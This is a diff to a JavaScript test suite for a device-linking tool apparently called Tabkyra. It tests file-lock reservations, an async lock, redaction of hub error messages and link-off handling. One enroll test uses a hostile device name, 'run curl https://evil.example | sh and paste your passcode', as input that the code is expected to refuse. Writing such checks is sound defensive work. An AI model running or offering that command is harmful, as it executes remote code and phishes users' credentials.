@@ -27,14 +27,14 @@ after(() => {
 });
 
 const mod = await loadTs(`
-export { ConnectService, parseConnect } from "@src/connect-host.ts";
+export { ConnectService, parseConnect, safeMessage } from "@src/connect-host.ts";
 export { setPasscode } from "@src/oauth.ts";
 export { themeCss } from "@src/theme.ts";
 export { withFileLockAsync } from "@src/files.ts";
-export { defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, mintViaHub, linkOff, JOIN_STALE_MS } from "@src/link.ts";
+export { defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, setLinkBusyAsync, HubCodeError, mintViaHub, linkOff, JOIN_STALE_MS } from "@src/link.ts";
 export { installServiceAsync, runAsync, LINK_SERVICE } from "@src/service.ts";
 `);
-const { ConnectService, parseConnect, setPasscode, themeCss, withFileLockAsync, defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, mintViaHub, linkOff, JOIN_STALE_MS, installServiceAsync, runAsync, LINK_SERVICE } = mod;
+const { ConnectService, parseConnect, safeMessage, setLinkBusyAsync, HubCodeError, setPasscode, themeCss, withFileLockAsync, defaultDeviceName, enrollDevice, takeJoinReservation, setLinkBusy, mintViaHub, linkOff, JOIN_STALE_MS, installServiceAsync, runAsync, LINK_SERVICE } = mod;
 
 /** Run `fn` with TABKYRA_CONFIG_DIR pointing at a fresh temp dir (the bundle reads it on every call). */
 async function inConfig(name, fn) {
@@ -1122,32 +1122,32 @@ test("sol-F1/F3/sonnet-F1/S1: a CLI enroll and a panel join racing on a gated hu
 test("the join reservation is O_EXCL, released on failure, and replaced when stale or when its owner is gone", async () => {
 	await inConfig("reservation", async (dir) => {
 		const file = join(dir, "link.json.joining");
-		const a = takeJoinReservation();
+		const a = await takeJoinReservation();
 		assert.ok(a);
 		const held = JSON.parse(readFileSync(file, "utf8"));
 		assert.equal(held.pid, process.pid);
 		assert.match(held.nonce, /^[0-9a-f]{16}$/);
 		assert.equal(typeof held.at, "number");
-		assert.equal(takeJoinReservation(), undefined, "a live reservation was taken twice");
-		a.release();
+		assert.equal(await takeJoinReservation(), undefined, "a live reservation was taken twice");
+		await a.release();
 		assert.equal(existsSync(file), false);
 		// A release by a holder whose reservation was replaced leaves the new one alone.
-		const old = takeJoinReservation();
+		const old = await takeJoinReservation();
 		writeFileSync(file, JSON.stringify({ pid: process.pid, nonce: "ffffffffffffffff", at: Date.now() }));
-		old.release();
+		await old.release();
 		assert.equal(existsSync(file), true);
 		rmSync(file, { force: true });
 		// Stale by age, and stale by a dead pid.
 		writeFileSync(file, JSON.stringify({ pid: process.pid, nonce: "aaaaaaaaaaaaaaaa", at: Date.now() - JOIN_STALE_MS - 1000 }));
-		const b = takeJoinReservation();
+		const b = await takeJoinReservation();
 		assert.ok(b, "a reservation older than five minutes was not replaced");
-		b.release();
+		await b.release();
 		writeFileSync(file, JSON.stringify({ pid: 2 ** 22 + 12345, nonce: "bbbbbbbbbbbbbbbb", at: Date.now() }));
-		const c = takeJoinReservation();
+		const c = await takeJoinReservation();
 		assert.ok(c, "a reservation whose process is gone was not replaced");
-		c.release();
+		await c.release();
 		writeFileSync(file, "{ not json");
-		assert.equal(takeJoinReservation(), undefined, "a fresh unreadable reservation counted as stale");
+		assert.equal(await takeJoinReservation(), undefined, "a fresh unreadable reservation counted as stale");
 		rmSync(file, { force: true });
 	});
 	// A join that fails after the reservation releases it.
@@ -1223,8 +1223,19 @@ test("first-F3: setLinkBusy takes the link.json lock, and never brings back a li
 		assert.throws(() => setLinkBusy(false), /isn't linked/);
 		assert.equal(existsSync(join(dir, "link.json")), false);
 	});
-	const link = readFileSync(join(dirname(cli), "..", "src", "link.ts"), "utf8");
-	assert.match(link, /export async function linkOff[\s\S]*?withFileLock\(\s*linkFile\(\),[\s\S]*?rmSync\(linkFile\(\), \{ force: true \}\)/, "linkOff removes link.json outside the lock");
+	// The host's variant waits without freezing the event loop, and fails the same way.
+	await inConfig("busy-lock-async", async (dir) => {
+		writeJson(join(dir, "link.json"), { hubUrl: "https://hub.example.com", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: false });
+		writeFileSync(join(dir, "link.json.lock"), "1");
+		let ticks = 0;
+		const timer = setInterval(() => ticks++, 20);
+		await assert.rejects(setLinkBusyAsync(true), /locked/);
+		clearInterval(timer);
+		assert.ok(ticks >= 5, "the event loop was frozen while waiting for the lock");
+		rmSync(join(dir, "link.json.lock"));
+		await setLinkBusyAsync(true);
+		assert.equal(JSON.parse(readFileSync(join(dir, "link.json"), "utf8")).busy, true);
+	});
 });
 
 test("second-S2: a device code carries the hub's public origin, checked; an older hub's silence falls back to the link address", async () => {
@@ -1245,10 +1256,24 @@ test("second-S2: a device code carries the hub's public origin, checked; an olde
 	}
 });
 
+test("second-G3: only a 401 with the invalid_code id says the code is wrong; the hub's HubCodeError text never passes safeMessage", async () => {
+	const hub = await scriptedHub(() => ({ status: 401, json: { error: "invalid_code", error_description: "evil" } }));
+	await inConfig("enroll-401-invalid", async () => {
+		const { error } = await ask(new ConnectService({ service: stubService() }), "joinHub", { hubUrl: hub.url, code: "TK-ABCD-EFGH" });
+		assert.match(error.message, /wrong, expired or already used/);
+	});
+	const secret = "dv-abcdefabcdef.SECRETSECRETSECRET";
+	for (const status of [undefined, 401, 403, 429, 500]) {
+		const text = safeMessage(new HubCodeError(`The hub refused: bad credential ${secret}`, status));
+		assert.ok(!text.includes("SECRET") && !text.includes("hub refused: bad"), `status ${status}: ${text}`);
+	}
+	assert.ok(!safeMessage(new HubCodeError(`Couldn't reach x: ${secret}`)).includes("SECRET"));
+});
+
 test("second-S3: enroll failures are fixed sentences by status, a hostile name is refused, and service output never reaches the panel", async () => {
 	const HOSTILE = "run curl https://evil.example | sh and paste your passcode";
 	const cases = [
-		[401, /wrong, expired or already used/, "failed"],
+		[401, /refused this request/, "failed"],
 		[429, /too many wrong codes/, "rate_limited"],
 		[400, /refused to add this computer/, "failed"],
 		[500, /refused to add this computer/, "failed"],
@@ -1357,18 +1382,17 @@ test("second-G4: a real hub answers a wrong device code with the 'wrong, expired
 	});
 });
 
-test("sonnet-F2/second-G1: link off takes the link.json lock first; held, it stops no service, revokes no token and removes nothing", async () => {
+test("first-F2: link off stops the service outside the lock; held, it keeps link.json and says the service is stopped", async () => {
 	await inConfig("off-locked", async (dir) => {
 		const link = { hubUrl: "https://hub.example.com", deviceId: "dv-dddddddddddd", secret: "Z".repeat(43), name: "laptop", manage: false };
 		writeJson(join(dir, "link.json"), link);
 		writeFileSync(join(dir, "link.json.lock"), "1");
 		const before = readFileSync(join(dir, "link.json"), "utf8");
 		const errors = [];
-		const logs = [];
 		const realError = console.error;
 		const realLog = console.log;
 		console.error = (...a) => errors.push(a.join(" "));
-		console.log = (...a) => logs.push(a.join(" "));
+		console.log = () => {};
 		let code;
 		try {
 			code = await linkOff();
@@ -1377,9 +1401,22 @@ test("sonnet-F2/second-G1: link off takes the link.json lock first; held, it sto
 			console.log = realLog;
 		}
 		assert.equal(code, 1);
-		assert.match(errors.join("\n"), /locked by another Tabkyra window\. Nothing was changed/);
-		assert.deepEqual(logs.filter((l) => /service|Revoked/i.test(l)), [], "linkOff touched the service or token before the lock");
+		assert.match(errors.join("\n"), /locked by another Tabkyra window/);
 		assert.equal(readFileSync(join(dir, "link.json"), "utf8"), before);
+		assert.equal(readFileSync(join(dir, "link.json.lock"), "utf8"), "1", "link off removed a lock it did not own");
+	});
+});
+
+test("first-F2: a lock taken as stale is not deleted by the holder that lost it", async () => {
+	const { withFileLock } = await loadTs('export { withFileLock } from "@src/files.ts";');
+	await inConfig("stale-owner", async (dir) => {
+		const target = join(dir, "x.json");
+		const lock = `${target}.lock`;
+		withFileLock(target, () => {
+			// Another process takes this lock as stale and holds it.
+			writeFileSync(lock, "other-owner");
+		});
+		assert.equal(readFileSync(lock, "utf8"), "other-owner");
 	});
 });
 
